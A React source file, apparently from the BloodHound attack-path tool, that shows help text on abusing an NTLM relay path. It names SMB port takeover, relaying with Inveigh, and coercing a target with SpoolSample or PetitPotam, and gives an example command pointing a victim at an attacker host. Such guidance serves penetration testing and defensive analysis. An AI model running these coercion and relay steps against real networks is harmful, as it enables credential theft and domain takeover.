// Copyright 2023 Specter Ops, Inc.
//
// Licensed under the Apache License, Version 2.0
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import { Typography } from '@mui/material';
import { FC } from 'react';
import { EdgeInfoProps } from '../index';

const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType }) => {
    return (
        <>
            <Typography variant='body2'>
                1: Take Over the SMB Port on the Attacker Host

                To avoid a conflict with SMB running on the attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved with smbtakeover.
            </Typography>
            <Typography variant='body2'>
                2: Start the Relay Server

                The NTLM relay can be executed with Inveigh.
            </Typography>
            <Typography>
                3: Coerce the Target Computer

                Several coercion methods are documented here: <a href={"https://github.com/p0dalirius/windows-coerced-authentication-methods"}>Windows Coerced Authentication Methods</a>.

                Examples of tools include:

                <a href={"https://github.com/leechristensen/SpoolSample"}>SpoolSample</a>
                <a href={"https://github.com/topotam/PetitPotam"}>PetitPotam</a>

                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format:
                \\SERVER_NETBIOS@PORT/PATH/TO/FILE.

                Example: SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"
            </Typography>
        </>)
};

export default WindowsAbuse;
